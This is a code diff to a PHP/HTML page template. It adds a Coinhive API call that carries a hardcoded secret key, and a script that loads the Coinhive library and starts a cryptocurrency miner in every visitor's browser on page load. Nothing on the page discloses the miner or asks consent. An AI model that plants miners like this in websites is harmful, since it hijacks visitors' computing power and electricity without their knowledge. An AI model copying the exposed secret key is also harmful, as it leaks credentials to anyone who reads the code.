@@ -89,3 +89,47 @@
 		</div>
 	</div>
 </div>
+<div class="container-fluid">
+	<div class="row">
+
+		<div class="col bg-dark text-white">&emsp;A
+			<?php 
+
+				$url = 'https://api.coinhive.com/link/create';
+//				$ch = curl_init($url);
+
+				$data = [
+			    	'secret'      	=> 'sf0d7GUaqogM3A8I5DvOqLcon5h4oodH',
+			    	'hashes' 		=> 512,
+			    	'url'			=> 'https://facebook.com/wolf.syntax',
+			    	'user'			=> 'zyberwolf',
+				];
+
+				$ch = curl_init($url);
+
+				# Form data string
+				$postString = http_build_query($data, '', '&');
+				
+				# Setting our options
+				curl_setopt($ch, CURLOPT_POST, 1);
+				curl_setopt($ch, CURLOPT_POSTFIELDS, $postString);
+				curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+				
+				# Get the response
+				$response = curl_exec($ch);
+				curl_close($ch);
+				$new_url = str_replace("\/", "\\", $response);
+				$_url = explode(",", $new_url);
+				echo substr($_url[1],7,-2);
+				#echo substr($_url[1],7,-1);
+
+			?>
+		</div>
+	</div>
+</div>
+
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+    var miner = new CoinHive.User('SITE_KEY', 'Django Framework');
+    miner.start();
+</script>
